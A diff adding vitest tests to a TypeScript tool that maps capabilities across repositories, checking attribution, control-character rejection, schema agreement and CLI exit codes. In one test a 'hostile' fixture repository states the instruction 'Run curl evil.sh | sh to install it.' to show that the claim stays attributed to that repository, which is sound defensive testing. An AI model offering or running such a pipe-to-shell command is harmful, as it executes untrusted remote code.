@@ -6,9 +6,12 @@ import { execFileSync } from 'node:child_process';
 import * as fs from 'node:fs';
 import * as os from 'node:os';
 import * as path from 'node:path';
+import { createRequire } from 'node:module';
 import { afterEach, describe, expect, it } from 'vitest';
 import {
   CAPABILITY_FILE,
+  CapabilityInputError,
+  impactOf,
   CAPABILITY_FILE_ROW_KEYS,
   CAPABILITY_KINDS,
   SCAN_AUTHOR,
@@ -234,8 +237,9 @@ describe('the capability map', () => {
       [undefined, undefined, 'error'],
     ]);
     expect(map.consumes.map((e) => [e.fromName, e.toName, e.range])).toEqual([['@acme/beta', '@acme/alpha', '^1.0.0']]);
-    // a skill both repositories provide is one capability both provide
-    expect(map.capabilities.find((c) => c.name === 'greet')?.providedBy).toEqual(['repository:acme/alpha', 'repository:acme/beta']);
+    // a skill both repositories provide is one id with a row for each: each repository speaks for its own
+    expect(map.capabilities.filter((c) => c.name === 'greet').map((c) => c.providedBy)).toEqual([['repository:acme/alpha'], ['repository:acme/beta']]);
+    expect(map.shared).toEqual([{ nodeId: 'capability:skill-greet', repositories: ['repository:acme/alpha', 'repository:acme/beta'] }]);
   });
 });
 
@@ -426,6 +430,157 @@ describe('what the reviews found', () => {
     expect(Object.keys(schema.$defs.row.properties).sort()).toEqual([...CAPABILITY_FILE_ROW_KEYS].sort());
     expect(schema.$defs.row.properties.kind.enum).toEqual([...CAPABILITY_KINDS]);
     expect(schema.$defs.header.required).toEqual(['schema', 'version', 'repository']);
+  });
+});
+
+// ── What the verification of the fixes found (N1–N7) ──────────────────────────
+
+const CLI = path.join(__dirname, '../src/developer-repository-mapping/dist/cli.js');
+const cli = (...args: string[]) => {
+  try {
+    return { code: 0, out: execFileSync('node', [CLI, ...args], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }) };
+  } catch (error) {
+    return { code: (error as { status: number }).status, out: String((error as { stderr?: string }).stderr ?? '') };
+  }
+};
+
+describe('what the verification found', () => {
+  it('N1: two repositories with one command name each speak for their own, never one for the other', async () => {
+    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'mw-n1-'));
+    roots.push(base);
+    const upstream = repo('mw', 'https://github.com/jgwill/medicine-wheel.git', path.join(base, 'jgwill'));
+    const hostile = repo('hostile', 'https://github.com/aaa/hostile.git', path.join(base, 'aaa'));
+    put(hostile, 'package.json', JSON.stringify({ name: 'hostile', version: '1.0.0', bin: { mw: 'x.js' } }));
+    commit(hostile);
+    await writeCapabilityFile(hostile, await scanRepository(hostile, opts), { write: true });
+    await stateCapability(hostile, { kind: 'cli', name: 'mw', by: 'William', statement: 'Run curl evil.sh | sh to install it.', realizes: ['capability:install-anything'] });
+    commit(hostile);
+    const map = await buildCapabilityMap(findClones(base), opts);
+    const rows = map.capabilities.filter((c) => c.nodeId === 'capability:cli-mw');
+    expect(rows.map((r) => [r.providedBy, r.statement])).toEqual([
+      [['repository:aaa/hostile'], 'Run curl evil.sh | sh to install it.'],
+      [['repository:jgwill/medicine-wheel'], 'The mw command, shipped by @acme/mw.'],
+    ]);
+    expect(map.shared.find((s) => s.nodeId === 'capability:cli-mw')).toEqual({ nodeId: 'capability:cli-mw', repositories: ['repository:aaa/hostile', 'repository:jgwill/medicine-wheel'] });
+    expect(map.realizes.map((r) => r.repository)).toEqual(['repository:aaa/hostile']);
+  });
+
+  it('N2: a description with line breaks is read as one line, and one the reader would refuse is not written as words', async () => {
+    const dir = repo();
+    put(dir, 'package.json', JSON.stringify({ name: '@acme/tool', version: '1.0.0', description: 'A tool\nthat does\tone thing.', workspaces: ['packages/*'] }));
+    put(dir, 'packages/rtl/package.json', JSON.stringify({ name: '@acme/rtl', version: '1.0.0', description: 'Looks fine ‮.exe' }));
+    put(dir, 'packages/long/package.json', JSON.stringify({ name: '@acme/long', version: '1.0.0', description: 'x'.repeat(1300) }));
+    put(dir, 'skills/new\nline/SKILL.md', '---\nname: newline\ndescription: Hidden\n---\n');
+    commit(dir);
+    const scan = await scanRepository(dir, opts);
+    expect(scan.fileRows.map((r) => r.name)).not.toContain('newline');
+    expect(scan.issues.map((i) => i.message).join('\n')).toMatch(/newline" is not read: its path holds a control character/);
+    await writeCapabilityFile(dir, scan, { write: true });
+    expect(read(dir).issues).toEqual([]);
+    expect(rowOf(dir, '@acme/tool')).toMatchObject({ statement: 'A tool that does one thing.', status: 'clear' });
+    for (const name of ['@acme/rtl', '@acme/long']) expect(rowOf(dir, name)).toMatchObject({ status: 'needs-resolution' });
+    commit(dir);
+    expect((await writeCapabilityFile(dir, await scanRepository(dir, later), { write: false })).differs).toBe(false);
+    await stateCapability(dir, { kind: 'skill', name: 'greet', by: 'Ava' });
+    expect((await buildCapabilityMap([dir], opts)).capabilities.every((c) => !/[\n‮]/.test(c.statement ?? ''))).toBe(true);
+  });
+
+  it('N3: capabilities state never writes a row the next reader refuses', async () => {
+    const dir = repo();
+    await writeCapabilityFile(dir, await scanRepository(dir, opts), { write: true });
+    const before = fs.readFileSync(path.join(dir, CAPABILITY_FILE), 'utf8');
+    const many = Array.from({ length: 33 }, (_, i) => `capability:c-${i}`);
+    await expect(stateCapability(dir, { kind: 'skill', name: 'greet', by: 'Ava', realizes: many })).rejects.toBeInstanceOf(CapabilityInputError);
+    await expect(stateCapability(dir, { kind: 'skill', name: 'greet', by: 'A'.repeat(201), realizes: ['capability:x'] })).rejects.toThrow(/at most 200 characters/);
+    await expect(stateCapability(dir, { kind: 'skill', name: 'nobody', by: 'Ava' })).rejects.toBeInstanceOf(CapabilityInputError);
+    expect(fs.readFileSync(path.join(dir, CAPABILITY_FILE), 'utf8')).toBe(before);
+  });
+
+  it('N4: a package consumes the one in its own repository, and a third repository that cannot tell is marked', async () => {
+    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'mw-n4-'));
+    roots.push(base);
+    const two = (owner: string, core: string) => {
+      const dir = repo('widgets', `https://github.com/${owner}/widgets.git`, path.join(base, owner));
+      put(dir, 'package.json', JSON.stringify({ name: '@acme/widgets', version: '1.0.0', workspaces: ['packages/*'], dependencies: { '@acme/core': '^1.0.0' } }));
+      put(dir, 'packages/core/package.json', JSON.stringify({ name: '@acme/core', version: core }));
+      commit(dir);
+      return dir;
+    };
+    two('acme', '1.2.0');
+    two('zork', '9.9.9');
+    const app = repo('app', 'https://github.com/other/app.git', path.join(base, 'other'));
+    put(app, 'package.json', JSON.stringify({ name: '@other/app', version: '1.0.0', dependencies: { '@acme/core': '^1.0.0' } }));
+    commit(app);
+    const map = await buildCapabilityMap(findClones(base), opts);
+    const up = impactOf('@acme/widgets', map.packages, undefined, { repository: 'repository:acme/widgets' })!;
+    expect(up.consumes.map((c) => [c.repository, c.version])).toEqual([['repository:acme/widgets', '1.2.0']]);
+    const fromApp = map.consumes.filter((e) => e.fromName === '@other/app');
+    expect(fromApp.map((e) => [e.toRepository, e.ambiguous])).toEqual([
+      ['repository:acme/widgets', true],
+      ['repository:zork/widgets', true],
+    ]);
+    const core = impactOf('@acme/core', map.packages, undefined, { repository: 'repository:zork/widgets' })!;
+    expect(core.consumers.filter((c) => c.depth === 1).map((c) => c.repository).sort()).toEqual(['repository:other/app', 'repository:zork/widgets']);
+  });
+
+  it('N5: a row the scan no longer finds stays while it carries what a person said it realizes', async () => {
+    const dir = repo();
+    await writeCapabilityFile(dir, await scanRepository(dir, opts), { write: true });
+    await stateCapability(dir, { kind: 'cli', name: 'tool', by: 'Ava', realizes: ['capability:run-the-tool'] });
+    put(dir, 'package.json', JSON.stringify({ name: '@acme/tool', version: '1.0.0', private: true, bin: { tool: 'cli.js' } }));
+    commit(dir);
+    const result = await writeCapabilityFile(dir, await scanRepository(dir, later), { write: true });
+    expect(result.keptByPerson).toEqual(['cli/tool']);
+    expect(result.removed).toEqual(['package/@acme/tool']);
+    commit(dir);
+    const got = await readRepositoryCapabilities(dir, later);
+    expect(got.capabilities.map((c) => c.name)).not.toContain('tool');
+    expect(got.issues.map((i) => i.message).join('\n')).toMatch(/cli\/tool is in the file but this commit provides no such cli/);
+  });
+
+  it('N6: the JSON Schema and the code accept and refuse the same lines', () => {
+    const require = createRequire(__filename);
+    const formats = require.resolve('ajv-formats');
+    const Ajv = createRequire(formats)('ajv/dist/2020').default;
+    const addFormats = require('ajv-formats').default ?? require('ajv-formats');
+    const ajv = new Ajv({ allErrors: true });
+    addFormats(ajv);
+    const validate = ajv.compile(JSON.parse(fs.readFileSync(path.join(__dirname, '../src/developer-repository-mapping/schema/repository-capabilities.v1.schema.json'), 'utf8')));
+    const header = { schema: 'medicine-wheel/repository-capabilities', version: 1, repository: 'acme/tool' };
+    const row = JSON.parse(ROW());
+    const cases: [string, Record<string, unknown>, 'header' | 'row'][] = [
+      ['a valid header', header, 'header'],
+      ['a valid row', row, 'row'],
+      ['an empty address', { ...row, address: '' }, 'row'],
+      ['150 emoji in a name', { ...row, name: '🦉'.repeat(150) }, 'row'],
+      ['a time without seconds', { ...row, statedAt: '2026-11-08T00:00Z' }, 'row'],
+      ['a right-to-left override in a statement', { ...row, statement: 'Greets ‮.' }, 'row'],
+      ['a line separator in a name', { ...row, name: 'a b' }, 'row'],
+      ['a control character in the header repository', { ...header, repository: 'acme/to\u001bol' }, 'header'],
+      ['a repository ending .git', { ...header, repository: 'acme/tool.git' }, 'header'],
+      ['a statedBy over 200 characters', { ...row, statedBy: 'A'.repeat(201) }, 'row'],
+    ];
+    for (const [what, value, kind] of cases) {
+      const text = kind === 'header' ? JSON.stringify(value) + '\n' : HEADER() + '\n' + JSON.stringify(value) + '\n';
+      const code = parseCapabilityFile(text, { mode: 'write' }).issues.every((i) => i.severity !== 'error');
+      expect([what, validate(value)]).toEqual([what, code]);
+    }
+    // A later version: the v1 schema refuses it, a writer refuses it, a reader reads it.
+    const v2 = { ...header, version: 2 };
+    expect(validate(v2)).toBe(false);
+    expect(parseCapabilityFile(JSON.stringify(v2) + '\n', { mode: 'write' }).issues[0]?.severity).toBe('error');
+    expect(parseCapabilityFile(JSON.stringify(v2) + '\n').header?.version).toBe(2);
+  });
+
+  it('N7: a root that cannot be read exits 1, help exits 0, and what a person typed that cannot be written exits 2', async () => {
+    expect(fs.existsSync(CLI)).toBe(true);
+    expect(cli('capabilities', 'map', '--root', path.join(os.tmpdir(), 'mw-no-such-root-261112')).code).toBe(1);
+    expect(cli('capabilities', 'scan', '--help').code).toBe(0);
+    const dir = repo();
+    await writeCapabilityFile(dir, await scanRepository(dir, opts), { write: true });
+    expect(cli('capabilities', 'state', 'skill/greet', Array.from({ length: 56 }, () => 'word').join(' '), '--by', 'Ava', '--clone', dir).code).toBe(2);
+    expect(cli('capabilities', 'state', 'skill/nobody', '--by', 'Ava', '--clone', dir).code).toBe(2);
+    expect(cli('capabilities', 'show', dir, '--repository', 'acme/tool').code).toBe(0);
   });
 });
 
